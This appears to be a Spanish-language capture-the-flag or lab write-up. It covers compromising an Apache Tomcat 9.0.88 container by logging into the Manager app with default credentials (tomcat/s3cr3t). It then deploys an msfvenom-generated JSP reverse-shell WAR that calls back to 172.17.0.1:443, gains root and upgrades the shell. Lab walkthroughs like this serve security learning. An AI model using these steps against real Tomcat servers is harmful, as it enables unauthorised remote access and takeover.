
![[nmap pn.png]]
nmap: 8080

---
en la pagina: 172.17.0.2:8080 hay una  versión del de tomcat: # Apache Tomcat/9.0.88
como exploit a esa versión no encontré mucho, pero en la pagina hay un "manager apps"

![image](https://github.com/user-attachments/assets/70c49eae-589a-4499-a86f-57ab5e1b3201)


en: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
buscamos las credenciales por default para poder entrar al "manager app"
intentamos con las credenciales

![image](https://github.com/user-attachments/assets/b0026c05-43eb-4f66-b9e6-244a3cd725d4)

> las credenciales: tomcat/s3cr3t

entramos al "magaer app" con esas credenciales

encontramos la parte de WAR file to deploy, donde se suben archivos .war

![image](https://github.com/user-attachments/assets/3f06bccc-e4cf-4d75-b32f-4143b581aa5c)

para poder tener una conexión RCE utilizamos: msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war

lo lanzamos y nos crea un:   revshell.war
![[generado.png]]

lo subimos en archivos "WAR" y luego lo cargamos

al subirlo aparece aquí: llamado /revshell
![[subido.png]]

>colocamos el terminal en escucha y presionamos el archivo y estamos dentro ya como root!
![[root.png]]

hacemos un "stty"

       - script /dev/null -c bash
       - stty raw -echo; fg
       - reset xterm
       - export SHELL=bash && export TERM=xterm
       - stty rows numero colums numero 

y quedara así:
![[root sup.png]]
